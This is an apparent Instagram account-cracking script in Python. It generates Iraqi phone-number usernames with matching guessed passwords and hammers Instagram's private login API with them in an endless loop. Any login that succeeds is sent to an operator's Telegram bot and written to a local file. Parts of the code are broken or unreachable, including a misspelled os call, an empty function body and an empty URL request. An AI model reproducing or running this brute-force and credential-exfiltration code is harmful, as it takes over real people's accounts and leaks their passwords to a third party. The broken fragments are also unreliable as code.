import os
try:
    import uuid
except:
    os.system ("pip install uuid")
try:
    from random import *
except:
	os.systeam("pip install random ")
try:
     import string

except:
    os.system("pip install string")
try:
    import requests

except:
    os.system ("pip install requests ")
try:
    from user_agent import generate_user_agent

except:
    os.system("pip install user_agent ")
try:
    from datetime import datetime
except:
    os.system("pip install datetime ")
try:
    import time
except:
    os.system("pip install time")
try:
    import pyfiglet
except:
    os.system("pip install pyfiglet")
os.system("clear")
import pyfiglet
import os
from time import sleep
import webbrowser
Z = '  \n'
rs = '1'
if '1' ==	rs:
	print('')
else:
    print(Z + u'\n\t Activation Ended send a message to Tele : @ET_60 ')
    exit()
x = '\033[1;31m'
logoo = """
\033[91m  Script Crack [ INSTA ] > i4m_qamar\033[97m
========================================
\033[91m
▒██   ██▒ █     █░▓█████  ███▄    █ 
▒▒ █ █ ▒░▓█░ █ ░█░▓█   ▀  ██ ▀█   █ 
░░  █   ░▒█░ █ ░█ ▒███   ▓██  ▀█ ██▒
 ░ █ █ ▒ ░█░ █ ░█ ▒▓█  ▄ ▓██▒  ▐▌██▒
▒██▒ ▒██▒░░██▒██▓ ░▒████▒▒██░   ▓██░
▒▒ ░ ░▓ ░░ ▓░▒ ▒  ░░ ▒░ ░░ ▒░   ▒ ▒ 
░░   ░▒ ░  ▒ ░ ░   ░ ░  ░░ ░░   ░ ▒░
 ░    ░    ░   ░     ░      ░   ░ ░ 
 ░    ░      ░       ░  ░         ░ 
  \033[97m                                  
========================================

\033[94m	Author >> Qamar
	T.me >> i4m_qamar
\033[97m
========================================
"""
Z = '\x1b[2;31m'
G = '\033[1;32m'
import random
import uuid
import requests
import string
from user_agent import generate_user_agent
from datetime import datetime
from random import *
from time import sleep
import requests
import os
import random
import json
import threading
import secrets,uuid
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
from uuid import uuid4
from user_agent import generate_user_agent

aa=0
zz=0
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
print(logoo)
ID = input(G +' ID TELEGRAM : ')
sleep(2)
tok = input (G +' TOKEN TELEGRAM : ')
sleep(3)
print('\n Kamek Chawareka \033[91m!¡!¡!¡!¡!¡\033[97m')

w= 'https://pastebin.com/raw/xPfV5eKD'
start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= Qamar UP ✓").json()
id_msg =(start_msg['result']["message_id"])
sha = requests.get(w).text
if  'KARLO' in sha:
    sleep(0.0)
r = requests.Session()
user = '0123456789'
h=0
abc = '\tAsia : 770 - 771 - 772\n\t\tKorek : 750 - 751 - 752\n\t\t\tZain : 780 - 781 - 782\n'
os.system('clear')
print(logoo)
print(abc)
print('========================================')
zzzz = input('Zhmarayak Halbzhera : ')
while True:
        h+=1
        us = str("".join(random.choice(user)for i in range(7)))
        username = '964'+zzzz+us
        password = '0'+zzzz+us
        url = 'https://i.instagram.com/api/v1/accounts/login/'
        headers = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        data = {
        'uuid': uid,
        'password': password,
         'username': username,
         'device_id': uid,
         'from_reg': 'false',
         '_csrftoken': 'missing',
         'login_attempt_countn': '0'}
        req_login = r.post(url,headers=headers,data=data,allow_redirects=True)
        if ("logged_in_user") in req_login.text:
            zz+=1
            print ('\033[1;32mGOOD : {h}')
            tlg =(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\nCrack By : @q4nas\n~~~~~~~~~~~~~~~~~\n NUM : {username}\n PASS : {password}\n~~~~~~~~~~~~~~~~~\nT.ME : @qan4s | T.CH : anas_hacker0')
            i = requests.post(tlg)
            with open('INSTA000.txt','a') as HACKED:
                HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username,password))
        elif '"message":"challenge_required","challenge"' in req_login.text:
            print (S+'Secure : '+username+' : '+password)
        else:
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=\nCrack By : @q4nas\n~~~~~~~~~~~~~~~~~\nNUM : {username}\nPASS : {password}\nTEST : ({h})\nGOOD : ({zz})\nBAD : ({aa})\n~~~~~~~~~~~~~~~~~\nT.ME : @qan4s | T.CH : anas_hacker0")
            aa+=1
            print(E+f'BAD : {h}')
else:
    print ('Telegram : @i4m_qamar')

    os.system('rm -rf list.txt')
    os.system('id -u > list,txt')
    uuid = open('list.txt', 'r')
    for n in uuid:
        qanas = n.split()

    idlist = requests.get('')
    idact = idlist.text


    ###############################
    def kurd():


    for nn in idact.split():
        print(nn)
        if nn == qanas[0]:
            if __name__ == '__main__':
                kurd()
